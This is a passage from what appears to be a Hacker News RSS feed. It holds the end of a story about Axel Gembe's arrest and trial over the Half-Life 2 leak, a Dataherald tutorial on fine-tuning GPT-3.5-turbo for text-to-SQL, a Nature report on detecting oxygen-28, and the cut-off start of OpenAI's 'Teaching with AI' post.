<figure> <a data-lightbox="true" href="https://assetsio.reedpopcdn.com/5_b81hcLL.png?width=1920&amp;height=1920&amp;fit=bounds&amp;quality=80&amp;format=jpg&amp;auto=webp" target="_blank">
<img alt="" height="387" loading="lazy" src="https://assetsio.reedpopcdn.com/5_b81hcLL.png?width=690&amp;quality=75&amp;format=jpg&amp;auto=webp" srcset="https://assetsio.reedpopcdn.com/5_b81hcLL.png?width=690&amp;quality=75&amp;format=jpg&amp;auto=webp 1x, https://assetsio.reedpopcdn.com/5_b81hcLL.png?width=690&amp;quality=75&amp;format=jpg&amp;dpr=2&amp;auto=webp 2x" width="600"> </a>
<figcaption>The initial level of Half-Life 2 open in Hammer.</figcaption></figure>
<p>Gembe reached for a kitchen knife to cut some bread. "Every policeman in the room raised his rifle at me," he says.</p>
<p>After drinking a cup of coffee and smoking a cigarette, Gembe climbed into the back of a van and was driven to the local police station. There he was greeted by the police chief. He walked up to Gembe, looked him in the eye and said, "Have you any idea how lucky you are that we got to you before you got on that plane?"</p>
<p>Gembe was interrogated by the police for three hours. "Most of the questions they asked me were about the Sasser-Worm," he says, referring to a particularly vicious malware that affects computers running vulnerable versions of Windows XP and Windows 2000.</p>
<p> "For some reason they thought there was a connection between me and Sasser, which I denied. Sasser was big news back then and its author, Sven Jaschan, was raided the same day as me in a co-ordinated operation, because they thought I could warn him.</p>
<p>"My bot used the same vulnerability in the LSASS service that his did, except it didn't crash the host system, so I guess they thought I gave him the exploit code. Of course I denied this and told them that I never write such shoddy code."</p>
<p>After the police began to realise there was no link between Gembe and the Sasser-Worm, they moved on to asking him about Valve.</p>
<p>"I could have refused to answer and demanded an attorney, but I chose to tell them everything I knew honestly and completely, which I guess they appreciated," he says. "The guy questioning me liked me because, he said, 'You are not an asshole like most of the other guys.' That department has to deal mostly with child porn.</p>
<p>"I guess I was so open with them because I didn't believe I did much wrong, at the time."</p>
<p>Gembe was remanded in custody for two weeks. He was released once the police were determined he wasn't about to flee, with the proviso that he check-in with them three times a week, every week, for three years, until his trial.</p>
</section><section>
<h2>Our Benefactors</h2>
<p>While waiting for his day in court, Gembe worked hard to change his life. He finished an apprenticeship and got a job in the security sector, writing Windows applications to manage security systems and performing database and server administration work. </p>
<p>Axel Gembe's trial lasted for seven hours. No one from Valve was present, though someone from the Wall Street Journal turned up. Security breach aside, there was no evidence to suggest Gembe had been responsible for pushing the Half-Life 2 source code on the internet.</p>
<p>However, Gembe admitted to hacking into Valve's network. The judge sentenced him to two years' probation, citing his rough childhood and the way he had worked to turn his life around as considerations when it came to deciding on the relatively lenient punishment.</p>
<p>By the time of the trial 8.6 million copies of Half-Life 2 had been sold, its success seemingly unaffected by the leak of 4th October 2003.</p>
<figure> <a data-lightbox="true" href="https://assetsio.reedpopcdn.com/eurogamer-yl39d4.jpg?width=1920&amp;height=1920&amp;fit=bounds&amp;quality=80&amp;format=jpg&amp;auto=webp" target="_blank">
<img alt="" height="388" loading="lazy" src="https://assetsio.reedpopcdn.com/eurogamer-yl39d4.jpg?width=690&amp;quality=75&amp;format=jpg&amp;auto=webp" srcset="https://assetsio.reedpopcdn.com/eurogamer-yl39d4.jpg?width=690&amp;quality=75&amp;format=jpg&amp;auto=webp 1x, https://assetsio.reedpopcdn.com/eurogamer-yl39d4.jpg?width=690&amp;quality=75&amp;format=jpg&amp;dpr=2&amp;auto=webp 2x" width="690"> </a>
<figcaption>Half-Life 2 did well, then. Although apparently not well enough to warrant a sequel...</figcaption></figure>
<p>Today Gembe is 28. Nearly a decade on, he is remorseful about the Half-Life 2 episode.</p>
<p>"I was naive and did things that I should never have done," he says. "There were so many better uses of my time. I regret having caused Valve Software trouble and financial loss. I also regret having caused some universities financial harm by using them as speed tests for my malware.</p>
<p>"Basically I regret all the illegal things I did at that time... And I regret not doing anything worthwhile with my life before I got busted."</p>
<p>What of the man he stole a game from? What would Axel Gembe say to Gabe Newell today?</p>
<p>"I would say this: I am so very sorry for what I did to you. I never intended to cause you harm. If I could undo it, I would. It still makes me sad thinking about it. I would have loved to just stay and watch you do your thing, but in the end I screwed it up.</p>
<p>"You are my favourite developer, and I will always buy your games."</p>
</section>
<section><p>This article was originally published on 21st February 2011.</p></section>

        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Fine-tuning GPT-3.5-turbo for natural language to SQL (196 pts)]]></title>
            <link>https://medium.com/dataherald/fine-tuning-gpt-3-5-turbo-for-natural-language-to-sql-4445c1d37f7c</link>
            <guid>37341670</guid>
            <pubDate>Thu, 31 Aug 2023 18:26:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://medium.com/dataherald/fine-tuning-gpt-3-5-turbo-for-natural-language-to-sql-4445c1d37f7c">https://medium.com/dataherald/fine-tuning-gpt-3-5-turbo-for-natural-language-to-sql-4445c1d37f7c</a>, See on <a href="https://news.ycombinator.com/item?id=37341670">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><a rel="noopener follow" href="https://medium.com/@MoPourreza?source=post_page-----4445c1d37f7c--------------------------------"><div aria-hidden="false"><p><img alt="Mo Pourreza" src="https://miro.medium.com/v2/resize:fill:88:88/0*FySGRXa2-ZkY4erI" width="44" height="44" loading="lazy" data-testid="authorPhoto"></p></div></a><a href="https://medium.com/dataherald?source=post_page-----4445c1d37f7c--------------------------------" rel="noopener follow"><div aria-hidden="false"><p><img alt="Dataherald" src="https://miro.medium.com/v2/resize:fill:48:48/1*J6SCHbRuAox7ra8MU-C61w.png" width="24" height="24" loading="lazy" data-testid="publicationPhoto"></p></div></a></div><figure><figcaption>Photo by <a href="https://unsplash.com/@maria_shalabaieva?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank">Mariia Shalabaieva</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank">Unsplash</a></figcaption></figure><h2 id="4adf"><strong>Background</strong></h2><p id="0ff1">Allowing non-technical users to ask questions from a database has been a problem of interest in academia and industry for years. The recent advances in Large Language Model (LLM) technology, such as GPT-4, have improved the accuracy of proposed solutions. However, since the most advanced LLMs have not been open for fine-tuning, recent work in the space has focused on creating Retrieval-Augmented Generation (RAG) algorithms that can enable complex Natural Language to SQL (NL-to-SQL) scenarios without modifying the underlying LLM.</p><p id="9046">Last week, OpenAI opened up GPT-3.5-turbo for fine-tuning. In this post, we will fine-tune our own NL-to-SQL model and compare its performance against the state of the art RAG approach. We will use the <a href="https://yale-lily.github.io/spider" rel="noopener ugc nofollow" target="_blank">Spider dataset</a> from Yale university as our test benchmark.</p><h2 id="323a"><strong>Fine-tuning GPT-3.5-Turbo for NL-to-SQL</strong></h2><p id="686d">Like all model training and fine-tuning, the first step of fine-tuning GPT-3.5-Turbo is the creation and upload of a training dataset. Since GPT-3.5-Turbo is a ChatModel, this dataset must use to the following format, and be uploaded as a JSONL file</p><pre><span id="572b">{"messages": [{"role": "system", "content": "system_prompt"}, {"role": "user", "content": "user_prompt"}, {"role": "assistant", "content": "assistant_prompt"}]}<br>{"messages": [{"role": "system", "content": "system_prompt"}, {"role": "user", "content": "user_prompt"}, {"role": "assistant", "content": "assistant_prompt"}]}<br>{"messages": [{"role": "system", "content": "system_prompt"}, {"role": "user", "content": "user_prompt"}, {"role": "assistant", "content": "assistant_prompt"}]}</span></pre><p id="f782">The Spider dataset has a holdout test set of 2147 question/SQL pairs, a development set of 1034 question/SQL pairs, and a training set of 7000 question/SQL pairs. We will build our fine-tuning dataset in the structure above from the Spider training set.</p><h2 id="4819">Creating the training dataset</h2><p id="95d8">An NL-to-SQL task is defined as follows: <strong>given a question and database, identify a SQL query that when executed against the database returns a result set that can answer the question.</strong> Various approaches have been explored on how best to prompt LLMs for this task, and it is generally agreed that the prompt needs to include an instructional component, details of the database schema, information about the database’s content, a set of task-specific demonstrations and of course the actual question at hand.</p><p id="9472">Given the format of the ChatModel training data, the elements above have to be presented within the following three prompts:</p><ul><li id="83de"><strong>system_prompt — </strong>will contain the instruction, database schema and database content</li><li id="c110"><strong>user_prompt — </strong>will contain the natural language question</li><li id="8561"><strong>assistant_prompt — </strong>where the SQL will be provided together with a reasoning step</li></ul><p id="d12f">Let’s look at how to create each of these for our NL-to-SQL training dataset.</p><p id="7733"><strong>The system prompt</strong></p><p id="77f2">Creating the system_prompt is by far the most complex part of this exercise. At a minimum, the system_prompt needs to include:</p><ol><li id="5574">The system instruction</li><li id="06fd">The DB schema</li><li id="b580">Information about the DB content</li></ol><p id="03a4">In addition, for any real-world use case with a large number of tables, the samples in the training set should also train the model to select the correct tables from the DB for the SQL query (i.e perform schema-linking).</p><p id="67ef"><strong>System Instruction</strong></p><p id="fd9a">For the instruction we used the following standard prompt</p><pre><span id="a793">You are an assistant that is an expert in generating Sqlite SQL queries.<br>Having the access to database content, generate a correct Sqlite SQL query for the given question.<br>### Database content ###</span></pre><p id="d654"><strong>Database Schema</strong></p><p id="10dd">In the literature there are many proposed prompt formats for the database schema and content with no clear consensus around which performs best. We found the following to be the optimal representation of the database schema:</p><pre><span id="c6a3">CREATE TABLE concert (<br>"concert_ID" INTEGER NOT NULL,<br>"concert_Name" TEXT NOT NULL, - the name of the concert<br>"Theme" TEXT, - theme of the concert<br>"Stadium_ID" TEXT NOT NULL,<br>"Year" TEXT, PRIMARY KEY ("concert_ID"),<br>FOREIGN KEY("Stadium_ID")<br>REFERENCES stadium ("Stadium_ID")<br>)<br>CREATE TABLE singer (<br>"Singer_ID" INTEGER NOT NULL,<br>"Name" TEXT, - name of the singer<br>"Country" TEXT NOT NULL, - country where the singer born<br>"Song_Name" TEXT NOT NULL, - the name of the song produced by the singer<br>"Song_release_year" TEXT, - The release year of the song<br>"Age" INTEGER,<br>"Is_male" BOOLEAN NOT NULL,<br>PRIMARY KEY ("Singer_ID")<br>)</span></pre><p id="df9c"><strong>Database Content</strong></p><p id="e114">After much experimentation we found the following template to perform the best at training the model about the database content:</p><pre><span id="3b3b">/*<br>Columns in concert and 3 examples in each column for the high cardinality columns :<br>concert_ID: 1025 , 1101 , 1247<br>concert_Name : "Fire", "Dance", "Sky"<br>Stadium_ID : 9, 10, 11<br>*/<br>/*<br>Columns in concert and all categories for the low cardinality columns :<br>Theme : " ROCK ", " POP ", " HIP-HOP "<br>Year : 2022, 2021, 2023, 2020<br>*/<br>/*<br>Columns in singer and 3 examples in each column for the high cardinality columns :<br>Singer_ID : 10235 , 110231 , 1242447<br>Name : "Jordan", "Gabriel", "Tiffany"<br>Country : "Iran", "India", "Canada"<br>Song_Name : "dance in the fire", "rain", "sky"<br>Age : 19, 20, 21<br>*/<br>/*<br>Columns in singer and all categories for the low cardinality columns :<br>Is_male : "MALE", "FEMALE",<br>Song_release_year : 2022, 2021, 2023, 2020<br>*/</span></pre><p id="787d">An important element in the database content is how to identify categorical (low cardinality) columns. The threshold for distinguishing between low and high cardinality columns depends on the context window size of the Large Language Model (LLM) being fine-tuned. Given the 4096 token context window of GPT-3.5-turbo, we determined 20 tokens as the appropriate threshold between low and high cardinality columns.</p><p id="cc9d"><strong>Schema Linking</strong></p><p id="41ac">The final challenge in creating the system_prompts for our training set is to provide samples in such a way that train the model to correctly perform schema-linking on the database. To do this, we employed the following heuristic: for each individual NL &lt;&gt; SQL sample we included a random selection of other tables from the DB in addition to the correct tables until we reached the context window limit of 4000 tokens. To mitigate the influence of positional information, we further randomized the order of tables. In short, each system_prompt included the schema and content of the relevant tables mixed in with other irrelevant tables, helping train the model in picking the correct tables for the query.</p><p id="bea8">We will now put all of this together to build our system_prompts.</p><p id="e2a9">For the sample below from Spider:</p><pre><span id="5c38">Question : "How many heads of the departments are older than 56 ?"<br>SQL: "SELECT count(*) FROM head WHERE age &gt; 56"</span></pre><p id="77b9">The system_prompt will be</p><pre><span id="a170">You are an assistant that is an expert in generating Sqlite SQL queries.<br>Having the access to database content, generate a correct Sqlite SQL query for the given question.<br>### Database content ###<br>CREATE TABLE trip (<br>id INTEGER, duration INTEGER,<br>start_date TEXT,<br>start_station_name TEXT,<br>start_station_id INTEGER,<br>end_date TEXT,<br>end_station_name TEXT,<br>end_station_id INTEGER,<br>bike_id INTEGER,<br>subscription_type TEXT,<br>zip_code INTEGER,<br>PRIMARY KEY (id)<br>)<br>/* Columns in trip and 3 examples in each column for high cardinality columns :<br>id : 900645, 900752, 900524<br>duration : 1131, 2146, 1155<br>start_date : 8/21/2015 17:39, 8/21/2015 17:03, 8/21/2015 17:16<br>start_station_name : Howard at 2nd, 2nd at Folsom, Market at 10th<br>start_station_id : 56, 65, 49 end_date : 8/21/2015 17:19, 8/21/2015 18:08, 8/21/2015 17:32<br>end_station_name : Howard at 2nd, 2nd at Folsom, Market at 10th<br>end_station_id : 56, 65, 49<br>bike_id : 586, 56, 65<br>zip_code : 94070, 94530, 94040–1724<br>*/<br>/* Columns in trip and all categories for low cardinality columns :<br>subscription_type : Customer, Subscriber<br>*/<p>CREATE TABLE management (<br>"department_ID" INTEGER,<br>"head_ID" INTEGER,<br>temporary_acting TEXT,<br>PRIMARY KEY ("department_ID", "head_ID"),<br>FOREIGN KEY("head_ID") REFERENCES head ("head_ID"),<br>FOREIGN KEY("department_ID") REFERENCES department ("Department_ID")<br>)<br>/* Columns in management and all categories for low cardinality columns :<br>department_ID : 7, 15, 2, 11<br>head_ID : 5, 4, 6, 3, 10<br>temporary_acting : Yes, No<br>*/</p><p>CREATE TABLE department (<br>"Department_ID" INTEGER,<br>"Name" TEXT,<br>"Creation" TEXT,<br>"Ranking" INTEGER,<br>"Budget_in_Billions" REAL,<br>"Num_Employees" REAL,<br>PRIMARY KEY ("Department_ID")<br>)<br>/* Columns in department and 3 examples in each column for high cardinality columns :<br>Department_ID : 1, 13, 11<br>Name : Energy, Interior, Health and Human Services<br>Creation : 1913, 1979, 1989<br>Ranking : 1, 13, 11<br>Budget_in_Billions : 10.7, 77.6, 59.7<br>Num_Employees : 112557.0, 3000000.0, 235000.0<br>*/</p><p>...<br>CREATE TABLE head (<br>"head_ID" INTEGER,<br>name TEXT,<br>born_state TEXT,<br>age REAL,<br>PRIMARY KEY ("head_ID")<br>)<br>/* Columns in head and all categories for low cardinality columns :<br>head_ID : 1, 2, 5, 7, 8, 4, 6, 3, 10, 9<br>name : Jeff Maggert, Pádraig Harrington, Billy Mayfair, K. J. Choi, Dudley Hart, Sergio García, Stewart Cink, Tiger Woods, Nick Faldo, Franklin Langham<br>born_state : Delaware, Connecticut, Alabama, California, Florida<br>age : 69.0, 67.0, 68.0, 53.0, 56.0, 52.0, 50.0, 43.0<br>*/</p><p>...</p></span></pre><p id="5770"><strong>The user prompt</strong></p><p id="7828">The user prompt is simple, the user question for each sample in Spider. For example:</p><pre><span id="01d7">How many heads of the departments are older than 56 ?</span></pre><p id="b9de"><strong>The assistant prompt</strong></p><p id="6bd4">The assistant prompt is also simple, containing the associated SQL query from Spider and the reasoning step to find the correct column and correct table for the SQL query. To construct the reasoning step we simply extracted the tables and columns that are used in the SQL query. For example:</p><pre><span id="6358">To construct the query, I'll be working with the following tables: head.<br>From these tables, I'll be using the following columns: age.<br>The SQL query I'll be generating is:<br>SELECT count(*) FROM head WHERE age &gt; 56</span></pre><p id="461e">Submitting the training set for fine-tuning</p><p id="1606">Once we have created the JSONL file (you can find a small sample <a href="https://github.com/Dataherald/dataherald-cookbook/blob/main/spider-fine-tuning/spider-fine-tuning-sample-dataset.jsonl" rel="noopener ugc nofollow" target="_blank">here</a>), the next step involves uploading the created file to OpenAI using the following command:</p><pre><span id="d08f">openai.api_key = os.getenv("OPENAI_API_KEY")<br>print(openai.File.create(file=open("spider-finetuning.jsonl", "rb"),purpose='fine-tune'))</span></pre><p id="e2ec">After uploading the file you can check the status of the upload using the following command:</p><pre><span id="812c">print(openai.File.retrieve(id="file-id"))<br>#OR<br>print(openai.File.list())</span></pre><p id="0e41">The result should be something like this:</p><pre><span id="1412">{<br>"object": "file",<br>"id": "file-id",<br>"purpose": "fine-tune",<br>"filename": "file",<br>"bytes": 71699079,<br>"created_at": 1693343752,<br>"status": "uploaded",<br>"status_details": null<br>}</span></pre><p id="892c">When the status has changed to processed (similar to below) you can use the file for fine-tuning:</p><pre><span id="461d">{<br>"object": "file",<br>"id": "file-id",<br>"purpose": "fine-tune",<br>"filename": "file",<br>"bytes": 71699079,<br>"created_at": 1693343752,<br>"status": "processed",<br>"status_details": null<br>}</span></pre><p id="c57c">Now, we are ready to start the fine-tuning job. To create a fine-tuning job you can use the following python code:</p><pre><span id="228b">print(openai.FineTuningJob.create(<br>training_file="file-id",<br>model="gpt-3.5-turbo",<br>suffix = "spider",<br>hyperparameters = {<br>"n_epochs": #number_of_epochs,<br>})<br>)</span></pre><p id="37ad">The duration of the fine-tuning process will vary depending on the size of the fine-tuning dataset. There is a maximum token limit for fine-tuning, which is set at 50,000,000 tokens. Therefore, when working with the Spider dataset, we reduced the number of samples from 7,000 to 5,750 and conducted fine-tuning for a total of 2 epochs.</p><p id="46b2">You can check the status of the fine-tuning job using the following command:</p><pre><span id="4365">print(openai.FineTuningJob.retrieve(id="ftjob-id"))</span></pre><p id="9c80">The result should be something like this:</p><pre><span id="b981">{<br>"object": "fine_tuning.job",<br>"id": "ftjob-id",<br>"model": "gpt-3.5-turbo-0613",<br>"created_at": 1693346245,<br>"finished_at": 1693353313,<br>"fine_tuned_model": "ft:gpt-3.5-turbo-0613:dataherald:spider:id",<br>"organization_id": "org-id",<br>"result_files": [<br>"file-id"<br>],<br>"status": "succeeded",<br>"validation_file": null,<br>"training_file": "file-id",<br>"hyperparameters": {<br>"n_epochs": 2<br>},<br>"trained_tokens": 44722020<br>}</span></pre><h2 id="bef0">Model Performance</h2><p id="d6da">We benchmarked the performance of the fine-tuned model against GPT3.5-Turbo without fine-tuning and DIN-SQL + GPT-4 (the current state of the art on Spider) for zero-shot performance.</p><p id="42f5">The results are as follows</p><figure></figure><p id="40d8">Performance of the fine-tuned GPT-3.5-Turbo against previous methods.</p><p id="e753">Fine-tuning GPT-3.5-Turbo yielded a performance improvement of nearly 11 percent brining its accuracy in line with the DIN-SQL + GPT-4, the current state-of-the-art approach which uses GPT-4 and employs various advanced prompting techniques, including few-shot prompting, chain-of-thought prompting and decomposed prompting.</p><p id="3c4e">Critically, the fine-tuned model <strong>significantly reduces both cost and processing time</strong> when compared to the DIN-SQL + GPT-4 approach. The table below provides an approximate cost and speed of difference between the models per single question from Spider.</p><figure></figure><p id="0961">Cost and speed of different models per question from Spider benchmark</p><p id="a8f4">As demonstrated above, the cost of the fine-tuned GPT-3.5-Turbo model is <strong>30 times less</strong> than DIN-SQL with GPT-4 and it is <strong>12 times faster.</strong></p><h2 id="23e1">Conclusion and Next Steps</h2><p id="59c4">The results from the experiment are clear: with an initial investment of time and money to build a training dataset the state of the art can be matched in accuracy, while being 12 times faster and 30 times cheaper.</p><p id="d483">Fine-tuning is a powerful tool in the NL-2-SQL arsenal. However it is not a silver bullet as few organizations have NL-to-SQL training datasets readily available. It is our belief that the best architectures will combine fine-tuned models together with RAG agents. With the anticipated launch of GPT-4 fine-tuning, we expect progress in the field to accelerate further and finally unlock question-answering from structured data for all businesses.</p><p id="dba3">In the next post we will show how to plug in the fine-tuned model above into the <a href="https://github.com/Dataherald/dataherald" rel="noopener ugc nofollow" target="_blank">Dataherald engine</a> and deploy it in a real world scenario.</p><p id="7d17">If you are interested in NL-2-SQL discussions you can join our <a href="https://discord.gg/A59Uxyy2k9" rel="noopener ugc nofollow" target="_blank">Discord server.</a> If you want to allow non-technical users to ask questions from your company’s data warehouse please join our <a href="https://www.dataherald.com/" rel="noopener ugc nofollow" target="_blank">waitlist</a>.</p><h2 id="d7bf">References</h2><p id="8361">DIN-SQL paper: <a href="https://arxiv.org/abs/2304.11015" rel="noopener ugc nofollow" target="_blank">https://arxiv.org/abs/2304.11015</a></p><p id="c418">NL-to-SQL useful papers:</p><p id="cd44">How to Prompt LLMs for Text-to-SQL: <a href="https://arxiv.org/abs/2305.11853" rel="noopener ugc nofollow" target="_blank">https://arxiv.org/abs/2305.11853</a></p><p id="79b4">Divide and Prompt: <a href="https://arxiv.org/abs/2304.11556" rel="noopener ugc nofollow" target="_blank">https://arxiv.org/abs/2304.11556</a></p><p id="02ee">Exploring Chain-of-Thought Style Prompting for Text-to-SQL: <a href="https://arxiv.org/abs/2305.14215" rel="noopener ugc nofollow" target="_blank">https://arxiv.org/abs/2305.14215</a></p><p id="5e55">A comprehensive evaluation of ChatGPT’s zero-shot Text-to-SQL capability: <a href="https://arxiv.org/abs/2303.13547" rel="noopener ugc nofollow" target="_blank">https://arxiv.org/abs/2303.13547</a></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Rare oxygen isotope detected (147 pts)]]></title>
            <link>https://www.nature.com/articles/d41586-023-02713-3</link>
            <guid>37340547</guid>
            <pubDate>Thu, 31 Aug 2023 17:14:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nature.com/articles/d41586-023-02713-3">https://www.nature.com/articles/d41586-023-02713-3</a>, See on <a href="https://news.ycombinator.com/item?id=37340547">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                    <figure>
 <picture>
  <source type="image/webp" srcset="https://media.nature.com/lw767/magazine-assets/d41586-023-02713-3/d41586-023-02713-3_25979970.jpg?as=webp 767w, https://media.nature.com/lw319/magazine-assets/d41586-023-02713-3/d41586-023-02713-3_25979970.jpg?as=webp 319w" sizes="(max-width: 319px) 319px, (min-width: 1023px) 100vw,  767px">
  <img alt="The Superconducting Ring Cyclotron in the Radioactive Isotope Beam Factory in Wakō, Saitama, Japan." loading="lazy" src="https://media.nature.com/lw767/magazine-assets/d41586-023-02713-3/d41586-023-02713-3_25979970.jpg">
  <figcaption>
   <p><span>The Riken RI Beam Factory in Wako, Japan, creates streams of radioactive isotopes with help from this superconducting ring cyclotron.</span><span>Credit: Nishina Center for Accelerator-Based Science</span></p>
  </figcaption>
 </picture>
</figure><p>By combining a powerful set of instruments with some experimental savvy, physicists have for the first time detected oxygen-28 — an isotope of oxygen that has 12 extra neutrons packed into its nucleus. Scientists have long predicted that this isotope is unusually stable. But initial observations of the <sup>28</sup>O nucleus suggest that this isn’t the case: it disintegrates rapidly after creation, a team reports in <i>Nature</i> today<sup><a href="#ref-CR1" data-track="click" data-action="anchor-link" data-track-label="go to reference" data-track-category="references">1</a></sup>. If the results can be replicated, physicists might need to update theories of how atomic nuclei are structured.</p><article data-label="Related">
  <a href="https://www.nature.com/articles/d41586-022-00711-5" data-track="click" data-track-label="recommended article"><img alt="" src="https://media.nature.com/w400/magazine-assets/d41586-023-02713-3/d41586-023-02713-3_20365206.jpg"><p>Long-awaited accelerator ready to explore origins of elements</p></a>
 </article><p>The strongest force in the Universe is the one that holds together the protons and neutrons in an atom’s nucleus. To unlock how elements are forged, the physics of neutron stars and more, scientists need to better understand this strong nuclear force, says Takashi Nakamura, a physicist at the Tokyo Institute of Technology. He and other researchers are testing theories about how atomic nuclei are held together by pushing them to extremes. One popular way is to load lightweight nuclei, such as oxygen, with excess neutrons and see what happens.</p><p>Current theories state that atomic nuclei with certain numbers of protons and neutrons are inherently stable. This is because protons and neutrons fill up ‘shells’ in the nucleus. When a shell is filled with just the right number of protons or neutrons, it becomes massively difficult to add or take away particles. These are ‘magic’ numbers, and have been thought to include 2, 8, 20, 28, 50, 82 and 126 particles. If a nucleus has a magic number of both neutrons and protons, it becomes ‘doubly magic’ — and therefore even more stable.</p><p>The most abundant form of oxygen, <sup>16</sup>O, is doubly magic, because of its eight protons and eight neutrons. Oxygen-28, with 8 protons and 20 neutrons, has long been predicted to be doubly magic, too. But physicists have not been able to detect it before.</p><h2>Ghost hunters</h2><p>Observing <sup>28</sup>O required several experimental feats. Key to the whole operation were the intense streams of radioactive isotopes produced by the Riken RI Beam Factory in Wako, Japan. The scientists fired a beam of calcium-48 isotopes at a beryllium target, which created a fluorine-29 isotope. The nucleus of this isotope has one more proton than does <sup>28</sup>O but the same number of neutrons. The scientists next smashed <sup>29</sup>F into a thick barrier of liquid hydrogen, knocking a proton out of the nucleus and generating <sup>28</sup>O.</p><figure>
 <picture>
  <source type="image/webp" srcset="https://media.nature.com/lw767/magazine-assets/d41586-023-02713-3/d41586-023-02713-3_25979986.jpg?as=webp 767w, https://media.nature.com/lw319/magazine-assets/d41586-023-02713-3/d41586-023-02713-3_25979986.jpg?as=webp 319w" sizes="(max-width: 319px) 319px, (min-width: 1023px) 100vw,  767px">
  <img alt="The a group photo of the team and the Oxygen-28 experiment setup at the RIKEN Radioactive Isotope Beam Factory." loading="lazy" src="https://media.nature.com/lw767/magazine-assets/d41586-023-02713-3/d41586-023-02713-3_25979986.jpg">
  <figcaption>
   <p><span>A large international team of researchers used instruments at the Riken RI Beam Factory to detect oxygen-28.</span><span>Credit: Yosuke Kondo</span></p>
  </figcaption>
 </picture>
</figure><p>This rare form of oxygen was too short-lived to be observed directly. Instead, the team detected its decay products: oxygen-24 plus four neutrons, a measurement that seemed impossible only a few years ago.</p><p>Measuring up to two neutrons at the same time has been done, but this is the first time scientists have detected four simultaneously, Nakamura says. “They are like ghosts,” he says of neutrons. With no electrical charge, neutrons can’t be wrangled in the same way that protons can (<sup>24</sup>O, with its eight positively charged protons, could be ushered into a detector with magnets). To observe individual neutrons, the team used a powerful detector built for that purpose, on loan from the GSI Helmholtz Centre for Heavy Ion Research in Darmstadt, Germany, in addition to Riken’s instruments. In this specialized detector, incoming neutrons are revealed when they knock protons around. Nakamura says that the study’s lead author, Tokyo Institute of Technology physicist Yosuke Kondo, used simulations to help to verify these tricky measurements.</p><p>“They’ve really done their homework,” says Robert Janssens, a physicist at the University of North Carolina at Chapel Hill. “They did all the checks you could do. It’s a tour de force.”</p><h2>Atomic limits</h2><p>Although the team wasn’t able to get an exact measurement of the lifetime of <sup>28</sup>O, Nakamura says that the isotope did not behave as if it were doubly magic — it fell apart almost as soon as it came into existence.</p><p>“I was surprised,” he says. “Personally, I thought it was doubly magic. But this is what nature says.”</p><article data-label="Related">
  <a href="https://www.nature.com/articles/d41586-019-00285-9" data-track="click" data-track-label="recommended article"><img alt="" src="https://media.nature.com/w400/magazine-assets/d41586-023-02713-3/d41586-023-02713-3_16424008.jpg"><p>Extreme chemistry: experiments at the edge of the periodic table</p></a>
 </article><p>This is not the first hint that nuclear physicists’ list of magic numbers is not universally applicable, says Rituparna Kanungo, a physicist at Saint Mary’s University in Halifax, Canada. She was part of a team of scientists that showed in 2009 that <sup>24</sup>O — contrary to the nuclear rulebook — has a nucleus that behaves as though it is doubly magic<sup><a href="#ref-CR2" data-track="click" data-action="anchor-link" data-track-label="go to reference" data-track-category="references">2</a></sup>. Its 8 protons and 16 neutrons are strongly bound to one another, giving it a relatively long lifetime — it takes about 61 milliseconds for half of the <sup>24</sup>O to disappear through radioactive decay. This means that in some nuclei, if they are strongly bound, 16 could be a magic number, too.</p><p>“Magic numbers are not immutable,” Janssens says.</p><p>For now, the confounding qualities of <sup>28</sup>O raise a whole host of questions about the forces that hold nuclei together. Physicists are daydreaming about possible next steps. Nakamura wants to see whether it’s possible to detect oxygen-30. Because the stability of different isotopes is a relative measurement, it would be helpful to compare <sup>28</sup>O with this heavier, yet-unseen, near neighbour.</p><p>“It’s so simple and so complicated,” Janssens says. “We don’t know at the moment how many protons and neutrons you can put together in a nucleus” and have them stay bound together, he adds. “In other words, what’s the limit?”</p>
                </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Teaching with AI (409 pts)]]></title>
            <link>https://openai.com/blog/teaching-with-ai</link>
            <guid>37340314</guid>
            <pubDate>Thu, 31 Aug 2023 17:00:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://openai.com/blog/teaching-with-ai">https://openai.com/blog/teaching-with-ai</a>, See on <a href="https://news.ycombinator.com/item?id=37340314">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content"><!--[--><!--[--><div><p>We’re sharing a few stories of how educators are using ChatGPT to accelerate student learning and some prompts to help educators get started with the tool. In addition to the examples below, our new <a href="https://help.openai.com/en/collections/5929286-educator-faq" rel="noopener noreferrer" target="_blank">FAQ</a> contains additional resources from leading education organizations on how to teach with and about AI, examples of new AI-powered education tools, and answers to frequently asked questions from educators about things like how ChatGPT works, its limitations, the efficacy of AI detectors, and bias.<br></p></div><!--]--><!--[--><div id="how-teachers-are-using-chatgpt" data-heading=""><p><h2>How teachers are using ChatGPT</h2></p></div><!--]--><!--[--><div id="role-playing-challenging-conversations" data-heading=""><p><h3>Role playing challenging conversations</h3></p></div><!--]--><!--[--><div><p>Dr. Helen Crompton, Professor of Instructional Technology at Old Dominion University, encourages her education graduate students to use ChatGPT as a stand-in for a particular persona—like a debate partner who will point out weaknesses in their arguments, a recruiter who’s interviewing them for a job, or a new boss who might deliver feedback in a specific way. She says exploring information in a conversational setting helps students understand their material with added nuance and new perspective. <br></p></div><!--]--><!--[--><div id="building-quizzes-tests-and-lesson-plans-from-curriculum-materials" data-heading=""><p><h3>Building quizzes, tests, and lesson plans from curriculum materials</h3></p></div><!--]--><!--[--><div><p>Fran Bellas, a professor at Universidade da Coruña in Spain, recommends teachers use ChatGPT as an assistant in crafting quizzes, exams and lesson plans for classes. He says to first share the curriculum to ChatGPT and then ask for things like fresh quiz and lesson plan ideas that use modern or culturally relevant examples. Bellas also turns to ChatGPT to help teachers make sure questions they write themselves are inclusive and accessible for the students’ learning level. “If you go to ChatGPT and ask it to create 5 question exams about electric circuits, the results are very fresh. You can take these ideas and make them your own.”<br></p></div><!--]--><!--[--><div id="reducing-friction-for-non-english-speakers" data-heading=""><p><h3>Reducing friction for non-English speakers</h3></p></div><!--]--><!--[--><div><p>Dr. Anthony Kaziboni, the Head of Research at the University of Johannesburg, teaches students who 